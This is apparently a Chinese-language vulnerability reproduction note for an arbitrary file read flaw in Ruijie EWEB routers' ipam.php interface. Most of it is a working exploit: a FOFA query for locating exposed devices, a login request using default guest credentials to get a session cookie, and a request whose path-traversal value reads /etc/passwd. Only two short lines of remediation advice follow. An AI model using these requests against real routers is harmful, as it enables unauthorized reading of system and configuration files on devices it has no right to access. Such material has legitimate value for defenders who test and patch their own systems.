# 一、漏洞概述

锐捷EWEB路由器 ipam.php 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。

# 二、资产测绘

FOFA:

```
title="锐捷网络-EWEB网管系统"
```

![image-20250712094942740](锐捷EWEB路由器 ipam.php 任意文件读取漏洞.assets/image-20250712094942740.png)

# 三、漏洞复现

1、获取可用cookie

```
POST /ddi/server/login.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
Connection: close
Content-Length: 30
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

username=guest&password=guest?
```

![image-20250712095010567](锐捷EWEB路由器 ipam.php 任意文件读取漏洞.assets/image-20250712095010567.png)

2、利用可用cookie读取文件

```
POST /ddi/server/ipam.php?a=getIpamJson HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
Connection: close
Content-Length: 27
Content-Type: application/x-www-form-urlencoded
Cookie: 9gc7sddr7vh3ghigv8jciphps4; user=guest; RUIJIEID=9gc7sddr7vh3ghigv8jciphps4
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip

path=../../../../etc/passwd
```

![image-20250712095045921](锐捷EWEB路由器 ipam.php 任意文件读取漏洞.assets/image-20250712095045921.png)

# 四、修复建议

1、关闭互联网暴露面或接口设置访问权限

2、升级至安全版本
